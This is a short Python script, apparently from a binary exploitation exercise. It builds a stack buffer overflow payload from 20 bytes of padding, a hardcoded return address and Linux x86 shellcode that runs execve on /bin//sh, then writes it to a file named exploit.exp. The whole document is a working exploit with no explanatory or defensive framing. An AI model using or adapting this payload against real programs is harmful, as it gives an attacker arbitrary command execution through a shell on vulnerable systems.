shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
return_address = b"\x60\xd0\xff\xff" # input + 0x18 0xffffd050
fill = b"A"*5*4

payload = fill + return_address + shellcode
f = open("exploit.exp", "wb")
f.write(payload)
f.close()